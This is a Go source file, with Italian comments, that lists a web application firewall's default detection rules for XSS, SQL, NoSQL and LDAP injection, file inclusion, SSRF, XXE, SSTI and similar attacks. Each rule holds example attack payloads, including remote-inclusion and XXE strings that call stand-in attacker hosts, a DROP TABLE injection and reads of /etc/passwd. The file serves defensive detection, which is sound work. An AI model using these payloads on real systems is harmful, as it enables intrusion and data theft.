package api

// DefaultRule rappresenta una regola di default hardcoded nel WAF
type DefaultRule struct {
	ID          string `json:"id"`
	Name        string `json:"name"`
	Type        string `json:"type"`
	Description string `json:"description"`
	Severity    string `json:"severity"`
	Examples    []string `json:"examples"`
	IsDefault   bool   `json:"is_default"`
	Enabled     bool   `json:"enabled"`
}

// GetDefaultRules ritorna tutte le regole di default implementate nel WAF
func GetDefaultRules() []DefaultRule {
	return []DefaultRule{
		{
			ID:        "default_xss",
			Name:      "Cross-Site Scripting (XSS)",
			Type:      "XSS",
			Severity:  "HIGH",
			IsDefault: true,
			Enabled:   true,
			Description: "Rileva tentativi di Cross-Site Scripting (XSS). Include pattern per script tag, event handler, funzioni JS pericolose e encoding.",
			Examples: []string{
				"<script>alert('xss')</script>",
				"<img src=x onerror=alert(1)>",
				"javascript:alert('xss')",
				"<body onload=alert('xss')>",
			},
		},
		{
			ID:        "default_sqli",
			Name:      "SQL Injection",
			Type:      "SQL_INJECTION",
			Severity:  "CRITICAL",
			IsDefault: true,
			Enabled:   true,
			Description: "Rileva tentativi di SQL Injection. Include pattern per UNION-based, boolean-based, time-based blind, stacked queries e information schema.",
			Examples: []string{
				"' OR '1'='1",
				"admin' --",
				"UNION SELECT * FROM users",
				"'; DROP TABLE users; --",
				"SLEEP(5)",
			},
		},
		{
			ID:        "default_nosql",
			Name:      "NoSQL Injection",
			Type:      "NOSQL_INJECTION",
			Severity:  "CRITICAL",
			IsDefault: true,
			Enabled:   true,
			Description: "Rileva tentativi di NoSQL Injection. Monitora pattern per MongoDB, CouchDB e altri database NoSQL.",
			Examples: []string{
				"{\"$ne\": \"\"}",
				"{\"$gt\": \"\"}",
				"db.users.find({$where: \"this.password==\\\"123\\\"\"})",
			},
		},
		{
			ID:        "default_lfi",
			Name:      "Local File Inclusion (LFI)",
			Type:      "LFI",
			Severity:  "HIGH",
			IsDefault: true,
			Enabled:   true,
			Description: "Rileva tentativi di Local File Inclusion. Monitora path traversal e inclusioni di file locali.",
			Examples: []string{
				"../../../etc/passwd",
				"....//....//....//etc/passwd",
				"php://filter/convert.base64-encode/resource=index.php",
				"/etc/passwd%00.txt",
			},
		},
		{
			ID:        "default_path_traversal",
			Name:      "Path Traversal",
			Type:      "PATH_TRAVERSAL",
			Severity:  "HIGH",
			IsDefault: true,
			Enabled:   true,
			Description: "Rileva tentativi di path traversal per accedere a directory non autorizzate.",
			Examples: []string{
				"../../../etc/passwd",
				"..\\..\\..\\windows\\system32\\config\\sam",
				"%2e%2e%2f%2e%2e%2fetc%2fpasswd",
			},
		},
		{
			ID:        "default_rfi",
			Name:      "Remote File Inclusion (RFI)",
			Type:      "RFI",
			Severity:  "CRITICAL",
			IsDefault: true,
			Enabled:   true,
			Description: "Rileva tentativi di Remote File Inclusion. Monitora inclusioni di file remoti.",
			Examples: []string{
				"?file=http://evil.com/shell.php",
				"?page=ftp://attacker.com/malware.txt",
				"include('http://attacker.com/backdoor.php')",
			},
		},
		{
			ID:        "default_cmd_injection",
			Name:      "Command Injection",
			Type:      "COMMAND_INJECTION",
			Severity:  "CRITICAL",
			IsDefault: true,
			Enabled:   true,
			Description: "Rileva tentativi di Command Injection. Monitora esecuzione di comandi sistema attraverso input.",
			Examples: []string{
				"; ls -la",
				"| cat /etc/passwd",
				"& whoami",
				"`ping 127.0.0.1`",
				"$(whoami)",
			},
		},
		{
			ID:        "default_xxe",
			Name:      "XML External Entity (XXE)",
			Type:      "XXE",
			Severity:  "CRITICAL",
			IsDefault: true,
			Enabled:   true,
			Description: "Rileva tentativi di XXE attacks attraverso processamento di XML malformato.",
			Examples: []string{
				"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
				"<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">",
			},
		},
		{
			ID:        "default_ssrf",
			Name:      "Server-Side Request Forgery (SSRF)",
			Type:      "SSRF",
			Severity:  "CRITICAL",
			IsDefault: true,
			Enabled:   true,
			Description: "Rileva tentativi di SSRF per accedere a risorse interne del server.",
			Examples: []string{
				"http://localhost:8080/admin",
				"http://127.0.0.1:3306",
				"http://169.254.169.254/latest/meta-data/",
				"gopher://localhost:9000",
			},
		},
		{
			ID:        "default_ldap",
			Name:      "LDAP Injection",
			Type:      "LDAP_INJECTION",
			Severity:  "HIGH",
			IsDefault: true,
			Enabled:   true,
			Description: "Rileva tentativi di LDAP Injection per manipolare query LDAP.",
			Examples: []string{
				"*)(uid=*",
				"admin*",
				"*)(|(uid=*",
			},
		},
		{
			ID:        "default_ssti",
			Name:      "Server-Side Template Injection (SSTI)",
			Type:      "SSTI",
			Severity:  "CRITICAL",
			IsDefault: true,
			Enabled:   true,
			Description: "Rileva tentativi di SSTI su template engine (Jinja2, ERB, Thymeleaf, ecc.).",
			Examples: []string{
				"{{ 7 * 7 }}",
				"<%= 7 * 7 %>",
				"#{7*7}",
				"${7*7}",
				"*{7*7}",
			},
		},
		{
			ID:        "default_resp_split",
			Name:      "HTTP Response Splitting",
			Type:      "HTTP_RESPONSE_SPLITTING",
			Severity:  "HIGH",
			IsDefault: true,
			Enabled:   true,
			Description: "Rileva tentativi di Response Splitting attraverso header injection.",
			Examples: []string{
				"HTTP/1.1 200 OK\r\n\r\n",
				"\r\nSet-Cookie: admin=true",
				"%0d%0aSet-Cookie:%20admin=1",
			},
		},
		{
			ID:        "default_proto_pollution",
			Name:      "Prototype Pollution",
			Type:      "PROTOTYPE_POLLUTION",
			Severity:  "HIGH",
			IsDefault: true,
			Enabled:   true,
			Description: "Rileva tentativi di Prototype Pollution su applicazioni JavaScript.",
			Examples: []string{
				"?__proto__[isAdmin]=true",
				"?constructor[prototype][isAdmin]=true",
				"{\"__proto__\": {\"isAdmin\": true}}",
			},
		},
	}
}
